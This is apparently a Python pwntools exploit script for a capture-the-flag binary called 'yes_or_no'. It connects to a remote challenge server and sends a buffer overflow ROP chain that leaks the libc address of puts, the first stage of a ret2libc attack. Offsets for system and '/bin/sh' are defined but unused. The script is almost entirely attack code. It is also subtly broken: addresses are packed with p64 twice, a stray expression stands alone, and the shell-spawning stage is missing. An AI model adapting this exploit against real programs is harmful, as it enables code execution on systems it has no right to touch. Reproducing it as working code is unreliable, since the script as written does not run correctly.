from pwn import *
context.log_level="debug"

#p=process("./yes_or_no") #local; (PATH)
p=remote("ctf.j0n9hyun.xyz", 3009) #nc; (IP, PORT)
'''
e=ELF("./yes_or_no")
libc=ELF("./libc-2.27.so")

system_offset=libc.symbols['system']
binsh_offset=libc.search('/bin/sh').next()

puts_plt=p64(e.plt['puts'])
puts_got=p


#0x0000000000400883 : pop rdi ; ret
#0x000000000040056e : ret
'''

#step0
p.recvuntil("Show me your number~!\n")
p.sendline("9830400")
p.recvuntil("That's cool. Follow me\n")

pop_rdi=p64(0x400883)
ret=p64(0x40056e)

puts_offset=0x809c0
system_offset=0x4f440
bin_offset=0x1b3e9a

puts_got=p64(0x601018)
puts_plt=p64(0x400580)
main_addr=p64(0x4006c7)



#stage0
payload='A'*0x12 + 'B'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)

puts_got

p.interactive()
